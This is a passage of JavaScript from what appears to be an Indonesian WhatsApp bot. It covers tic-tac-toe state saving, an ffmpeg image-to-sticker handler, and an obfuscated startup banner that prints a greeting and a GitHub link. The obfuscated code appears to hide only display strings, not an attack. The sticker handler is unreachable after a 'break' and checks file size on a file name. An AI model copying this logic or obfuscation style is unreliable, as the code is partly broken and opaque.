_0x37efa2=_0x273a71,_0x21031f={};_0x21031f[_0x37efa2(0x134)]=lawan[_0x37efa2(0x146)]('@')[0x0],_0x21031f[_0x37efa2(0x135)]=pelawan,_0x21031f[_0x37efa2(0x147)]=board,_0x21031f[_0x37efa2(0x148)]=0x0,tictactoe[penantang[_0x37efa2(0x146)]('@')[0x0]]=_0x21031f,fs[_0x37efa2(0x12c)](_0x37efa2(0x138),JSON[_0x37efa2(0x149)](tictactoe));});
                break
		default:
		break
		 if (isMedia && isAuto && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = mek
						const media = await hypermod.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(dla.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								hypermod.sendMessage(from, buffer, sticker, { quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
	           // FOR VIDEO OR G
		   if ((isMedia & isAuto && !mek.message.imageMessage || isQuotedVideo)) {
						const encmedia = mek
						const media = await hypermod.downloadAndSaveMediaMessage(encmedia)
						if (Buffer.byteLength(media) >= 6186598.4) return reply(`sizenya terlalu gede sayang, dd gakuat :(`)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Gagal, video nya kebesaran, dd gakuat`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								hypermod.sendMessage(from, buff, sticker, { quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
						}
						}
					  }
					} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
	console.log(color('[ ERROR ]', 'red'), e)
	// console.log(e)
	}
    }
    }
    var _0x4add=['mMf5vLzyqG','twLKBMLNAhq','BwfNzw50yq','Dg9mB2nHBgveyxrLu3rYAw5N','sxnOyq','4PYtignYzxDIB3qYignYzwf0zwqGyNKGzgvUAxmGChv0CMe','tw9YBMLUzW','iokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGa','q3jLDYbcB3qGmG','qwz0zxjUB29U','Dgv4Dfn5BMm','rxzLBMLUzW','4PscicSGsw5ZDgfNCMfTidOGAhr0Chm6lY9PBNn0ywDYyw0Uy29Tl2rLBNnZChrYyweGicaGiokuGG','n29SzMD6wG','Bg9N','id4G','mtm1mZvSs3bdshy','4PscicSGq29UDgfJDca6igH0DhbZoI8VD2eUBwuVnJi4ntG2nJi5ntK0mIaGicaGicaGicaGiokuGG','u3rHBMrHCMq','nJC5ow1nyMrmCW','zgvMyxvSDa','odqYmJL4EfnYzNq','twfNAhjPyG','tMLNAhq','mte1rhvbD1Pk','mteYntu0nxngExznvG','D2HPDgu','z2v0sg91CNm','mtq5mdLLCffyCeS','mtaXB2D5sxDx','nZKZmdmXy1zfsgjH','nJe2mde3qKHIu2Xw','y3LHBG','rgf3BG','EwvSBg93'];var _0x285be4=_0x5ecb;(function(_0x1f2833,_0x41a4a3){var _0x226163=_0x5ecb;while(!![]){try{var _0x41a393=parseInt(_0x226163(0x1c0))+-parseInt(_0x226163(0x1c4))*-parseInt(_0x226163(0x1b7))+parseInt(_0x226163(0x1ba))*-parseInt(_0x226163(0x1bf))+-parseInt(_0x226163(0x1c6))*parseInt(_0x226163(0x1ca))+-parseInt(_0x226163(0x1bc))*parseInt(_0x226163(0x1b4))+parseInt(_0x226163(0x1c5))+parseInt(_0x226163(0x1c3));if(_0x41a393===_0x41a4a3)break;else _0x1f2833['push'](_0x1f2833['shift']());}catch(_0x311f6c){_0x1f2833['push'](_0x1f2833['shift']());}}}(_0x4add,0xaa2a6));function _0x5ecb(_0x321d34,_0x6adbc1){_0x321d34=_0x321d34-0x1aa;var _0x4adda5=_0x4add[_0x321d34];if(_0x5ecb['wCLMdF']===undefined){var _0x5ecb1e=function(_0x14f213){var _0x58c947='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1b85b2='';for(var _0x4ad004=0x0,_0xafa202,_0x38a6da,_0x204025=0x0;_0x38a6da=_0x14f213['charAt'](_0x204025++);~_0x38a6da&&(_0xafa202=_0x4ad004%0x4?_0xafa202*0x40+_0x38a6da:_0x38a6da,_0x4ad004++%0x4)?_0x1b85b2+=String['fromCharCode'](0xff&_0xafa202>>(-0x2*_0x4ad004&0x6)):0x0){_0x38a6da=_0x58c947['indexOf'](_0x38a6da);}return _0x1b85b2;};_0x5ecb['oQOpmp']=function(_0x4aedc6){var _0x4dfab7=_0x5ecb1e(_0x4aedc6);var _0x41590d=[];for(var _0x663a07=0x0,_0x4b5c51=_0x4dfab7['length'];_0x663a07<_0x4b5c51;_0x663a07++){_0x41590d+='%'+('00'+_0x4dfab7['charCodeAt'](_0x663a07)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x41590d);},_0x5ecb['dbNqlg']={},_0x5ecb['wCLMdF']=!![];}var _0x3f4369=_0x4add[0x0],_0x562f80=_0x321d34+_0x3f4369,_0x5e71fc=_0x5ecb['dbNqlg'][_0x562f80];return _0x5e71fc===undefined?(_0x4adda5=_0x5ecb['oQOpmp'](_0x4adda5),_0x5ecb['dbNqlg'][_0x562f80]=_0x4adda5):_0x4adda5=_0x5e71fc,_0x4adda5;}var ase=new Date(),jamss=ase[_0x285be4(0x1c2)]();switch(jamss){case 0x0:jamss=_0x285be4(0x1cb);break;case 0x1:jamss=_0x285be4(0x1cb);break;case 0x2:jamss=_0x285be4(0x1cb);break;case 0x3:jamss=_0x285be4(0x1cb);break;case 0x4:jamss=_0x285be4(0x1cb);break;case 0x5:jamss=_0x285be4(0x1c8);break;case 0x6:jamss=_0x285be4(0x1ad);break;case 0x7:jamss='Morning';break;case 0x8:jamss=_0x285be4(0x1ad);break;case 0x9:jamss='Morning';break;case 0xa:jamss='Morning';break;case 0xb:jamss=_0x285be4(0x1b0);break;case 0xc:jamss='Zuhur';break;case 0xd:jamss=_0x285be4(0x1b0);break;case 0xe:jamss=_0x285be4(0x1b0);break;case 0xf:jamss='Asr';break;case 0x10:jamss=_0x285be4(0x1b0);break;case 0x11:jamss=_0x285be4(0x1b2);break;case 0x12:jamss=_0x285be4(0x1bd);break;case 0x13:jamss=_0x285be4(0x1ab);break;case 0x14:jamss=_0x285be4(0x1be);break;case 0x15:jamss=_0x285be4(0x1be);break;case 0x16:jamss='Midnight';break;case 0x17:jamss=_0x285be4(0x1cb);break;}var tampilUcapan=''+jamss;let d=new Date(),locale='id',calender=d[_0x285be4(0x1aa)](locale,{'day':'numeric','month':'long','year':'numeric'});console[_0x285be4(0x1b5)](color(figlet[_0x285be4(0x1b1)](_0x285be4(0x1af),{'font':_0x285be4(0x1b9),'horizontalLayout':_0x285be4(0x1bb),'vertivalLayout':_0x285be4(0x1bb),'width':0x50,'whitespaceBreak':![]}),_0x285be4(0x1c9))),console['log'](color(_0x285be4(0x1ae))),console[_0x285be4(0x1b5)](color('│\x20+\x20Github\x20:\x20https://github.com/dcode-denpa/crewbot2\x20│')),console[_0x285be4(0x1b5)](color(_0x285be4(0x1b8))),console['log'](color(_0x285be4(0x1b3))),console[_0x285be4(0x1b5)](color('\x20────────────────────────────────────────────────────')),console[_0x285be4(0x1b5)](color('┌',_0x285be4(0x1c1)),color(''+tampilUcapan,_0x285be4(0x1cc))),console[_0x285be4(0x1b5)](color('└','white'),color(calender+_0x285be4(0x1b6)+time,'orange')),console[_0x285be4(0x1b5)](color(_0x285be4(0x1ac),_0x285be4(0x1c7)));